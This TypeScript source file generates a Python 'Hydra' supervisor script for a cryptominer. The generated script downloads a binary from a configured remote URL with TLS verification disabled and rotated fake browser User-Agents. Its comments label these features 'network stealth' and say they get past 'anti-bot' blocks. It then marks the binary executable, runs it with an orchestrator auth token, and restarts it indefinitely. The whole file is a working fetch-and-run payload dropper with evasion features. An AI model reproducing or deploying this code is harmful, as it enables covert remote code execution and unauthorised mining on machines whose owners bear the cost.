// INICIO DEL ARCHIVO [tools/provisioner/src/lib/payload.ts]
import { config } from '../config';

export function generateMinerPayload(workerId: string): string {
  // Python Supervisor V5: Hydra-Elite Edition
  // Features: GPU Detection, Self-Healing Download, Signal Handling
  return `
import os
import subprocess
import time
import sys
import random
import urllib.request
import ssl
import signal
import platform

# --- CONFIGURATION ---
BINARY_URL = "${config.MINER_BINARY_URL}"
ORCH_URL = "${config.ORCHESTRATOR_URL}"
TOKEN = "${config.WORKER_AUTH_TOKEN}"
WORKER_ID = "${workerId}"
BIN_NAME = "prospector-miner"

# --- SYSTEM RECON ---
def get_hardware_info():
    try:
        # Check for NVIDIA SMI to confirm GPU presence
        gpu_check = subprocess.run(['nvidia-smi'], stdout=subprocess.PIPE, stderr=subprocess.PIPE)
        has_gpu = gpu_check.returncode == 0
        return "GPU_ACCELERATED" if has_gpu else "CPU_FALLBACK"
    except:
        return "UNKNOWN_HW"

# --- STEALTH LOGGING ---
def log(msg):
    ts = time.strftime("%H:%M:%S")
    print(f"[{ts}] [HYDRA:{WORKER_ID}] {msg}", flush=True)

# --- NETWORK STEALTH ---
def get_random_user_agent():
    agents = [
        "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/120.0.0.0 Safari/537.36",
        "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.2 Safari/605.1.15",
        "Mozilla/5.0 (X11; Linux x86_64; rv:109.0) Gecko/20100101 Firefox/115.0"
    ]
    return random.choice(agents)

def download_payload():
    retry_count = 0
    max_retries = 5

    while retry_count < max_retries:
        try:
            log(f"⬇️ Downloading payload from CDN (Attempt {retry_count+1})...")

            ctx = ssl.create_default_context()
            ctx.check_hostname = False
            ctx.verify_mode = ssl.CERT_NONE

            req = urllib.request.Request(
                BINARY_URL,
                data=None,
                headers={'User-Agent': get_random_user_agent()}
            )

            with urllib.request.urlopen(req, context=ctx, timeout=60) as response, open(BIN_NAME, 'wb') as out_file:
                data = response.read()
                out_file.write(data)

            os.chmod(BIN_NAME, 0o755)
            size_mb = os.path.getsize(BIN_NAME) / (1024 * 1024)

            if size_mb < 1.0:
                raise Exception("Binary too small, possible corruption or anti-bot block.")

            log(f"✅ Download complete. Size: {size_mb:.2f} MB")
            return True

        except Exception as e:
            log(f"❌ Download error: {e}")
            retry_count += 1
            time.sleep(random.randint(2, 10))

    return False

def signal_handler(sig, frame):
    log("🛑 Received kill signal. Shutting down gracefully...")
    sys.exit(0)

def main_loop():
    signal.signal(signal.SIGINT, signal_handler)
    signal.signal(signal.SIGTERM, signal_handler)

    if not download_payload():
        log("💀 FATAL: Could not acquire payload. Aborting.")
        return

    hw_mode = get_hardware_info()
    log(f"⚙️ Hardware Mode: {hw_mode}")

    cmd = [
        f"./{BIN_NAME}",
        f"--orchestrator-url={ORCH_URL}",
        f"--auth-token={TOKEN}",
        f"--worker-id={WORKER_ID}"
    ]

    backoff = 1

    while True:
        log(f"🚀 Igniting Miner Sequence (Backoff: {backoff}s)")
        process = None
        try:
            process = subprocess.Popen(
                cmd,
                stdout=subprocess.PIPE,
                stderr=subprocess.STDOUT,
                universal_newlines=True,
                bufsize=1
            )

            # Stream logs in real-time
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    print(output.strip(), flush=True)

            rc = process.poll()

            if rc == 0:
                log("🏁 Process finished gracefully.")
                break
            else:
                log(f"⚠️ Process crashed (Code: {rc}). Restarting...")

            time.sleep(backoff)
            backoff = min(backoff * 2, 60)

        except Exception as e:
            log(f"💀 Supervisor Exception: {e}")
            time.sleep(10)
        finally:
            if process and process.poll() is None:
                process.kill()

if __name__ == "__main__":
    print("--- HYDRA NODE INITIALIZATION v5.0 ---")
    main_loop()
`;
}
// FIN DEL ARCHIVO
